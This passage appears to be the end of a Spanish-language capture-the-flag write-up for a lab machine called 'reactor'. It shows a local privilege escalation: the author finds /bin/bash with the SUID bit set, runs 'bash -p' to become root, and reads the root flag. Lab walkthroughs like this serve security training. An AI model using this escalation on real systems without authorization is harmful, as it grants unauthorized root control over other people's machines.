engineer@reactor:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```
Ya tiene **permisos SUID**.

Solamente ejecutamos la **Bash** con privilegios:
```bash
engineer@reactor:~$ bash -p
bash-5.2# whoami
root
```
Y somos **Root**.

Busquemos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# ls
root.txt
bash-5.2# cat root.txt
...
```
Y con esto, terminamos la máquina.
